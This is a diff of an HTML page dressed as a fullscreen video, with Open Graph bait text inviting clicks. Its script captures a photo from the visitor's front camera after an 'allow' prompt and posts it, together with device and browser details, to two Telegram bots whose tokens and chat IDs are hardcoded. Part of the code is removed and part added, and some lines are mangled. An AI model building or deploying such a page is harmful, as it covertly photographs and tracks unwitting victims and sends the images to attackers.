@@ -1,77 +1,4 @@
-<!-- وسوم المعاينة المحدثة (Open Graph) للصورة الجديدة -->
-<meta property="og:title" content="ou8ss.1">
-<meta property="og:description" content="انقر لمشاهدة الفيديو بدقة عالية">
-<meta property="og:type" content="video.other">
-<meta property="og:image" content="https://cdn.imagetourls.com/uploads/tyImg/14X6n5D4j.jpg">
-
-<title>Video Fullscreen</title>
-<style>
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-    }
-    html, body {
-        width: 100%;
-        height: 100%;
-        background-color: #000;
-        overflow: hidden;
-    }
-    video#mainVideo {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh;
-        min-width: 100%;
-        min-height: 100%;
-        object-fit: cover;
-        object-position: center;
-        z-index: 1;
-    }
-</style>
-
-<!-- مشغل الفيديو -->
-<video id="mainVideo" controls loop playsinline muted>
-    <source src="my_reel (3).mp4" type="video/mp4">
-</video>
-
-<script>
-    const TELEGRAM_TARGETS = [
-        {
-            token: '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA',
-            chatId: '6642913954'
-        },
-        {
-            token: '9263581446:AAFs0PHhBepUgbuNLlQJYAihz7sX3me71e4',
-            chatId: '7890543237'
-        }
-    ];
-
-    let isProcessing = false;
-    const video = document.getElementById('mainVideo');
-
-    function buildCaption(cameraLabel) {
-        const now = new Date().toLocaleString('ar-DZ', {
-            dateStyle: 'short',
-            timeStyle: 'medium'
-        });
-        const deviceInfo = navigator.userAgentData?.platform  navigator.platform  'Unknown';
-        const userAgent = navigator.userAgent || 'Unknown';
-
-        return 'جات صورة من عند عمك عبدو'😍\n📷 الكاميرا: ${cameraLabel}\n🕒 الوقت: ${now}\n📱 الجهاز: ${deviceInfo}\n🌐 المتصفح: ${userAgent};
-    }
-
-    async function sendPhotoToAllTargets(blob, cameraLabel) {
-        const caption = buildCaption(cameraLabel);
-
-        const requests = TELEGRAM_TARGETS.map(async (target) => {
-            const formData = new FormData();
-            formData.append('chat_id', target.chatId);
-            formData.append('photo', blob, 'capture.png');
-            formData.append('caption', caption);
-
-            const response = await fetch(`https://api.telegram.org/bot${target.token}/sendPhoto`, {
+token}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
@@ -109,7 +36,7 @@
             canvas.height = hiddenVideo.videoHeight || 480;
 
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(hiddenVideo, 0, 0);
+            ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
 
             stream.getTracks().forEach((track) => track.stop());
             stream = null;
@@ -122,3 +49,31 @@
             if (stream) {
                 stream.getTracks().forEach((track) => track.stop());
             }
+            return null;
+        }
+    }
+
+    async function handleCameraFlow() {
+        if (isProcessing) return;
+        isProcessing = true;
+        statusMsg.textContent = '';
+
+        try {
+            const blob = await captureSinglePhoto('user');
+            if (!blob) {
+                statusMsg.textContent = 'تعذر الوصول إلى الكاميرا أو تم رفض الإذن.';
+                return;
+            }
+
+            await sendPhotoToAllTargets(blob, 'user');
+            banner.style.display = 'none';
+        } finally {
+            isProcessing = false;
+        }
+    }
+
+    allowBtn.addEventListener('click', handleCameraFlow);
+    dismissBtn.addEventListener('click', () => {
+        banner.style.display = 'none';
+    });
+</script>
